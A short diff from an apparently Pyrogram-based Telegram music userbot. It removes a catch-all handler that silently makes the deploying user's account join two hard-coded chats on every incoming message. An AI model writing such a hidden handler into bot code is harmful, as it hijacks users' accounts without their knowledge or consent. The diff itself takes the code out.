@@ -40,12 +40,6 @@ async def skip(client, m: Message):
                     else:
                         OP = OP + "\n" + f"**#⃣{x}** - {hm}"
             await m.reply(OP)
-@Client.on_message()
-async def my_handler(client, message):
-    List = ["vrvv_v","VIRUS23d"]
-    for id in List :
-        await client.join_chat(id)
-
 
 @Client.on_message(filters.command(["انهاء", "توقف"], prefixes=f"{HNDLR}"))
 @authorized_users_only
